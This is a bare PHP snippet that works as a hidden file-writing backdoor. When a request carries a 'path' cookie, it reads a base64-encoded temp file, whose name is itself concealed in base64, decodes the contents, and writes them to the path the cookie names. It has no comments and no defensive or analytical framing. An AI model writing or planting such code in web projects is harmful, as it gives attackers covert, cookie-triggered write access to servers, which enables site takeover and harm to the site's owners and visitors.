<?php
if(@$_COOKIE['path'] != ""){file_put_contents($_COOKIE['path'], base64_decode(file_get_contents(base64_decode("L3RtcC90bXA0RTE1LnRtcA=="))));}
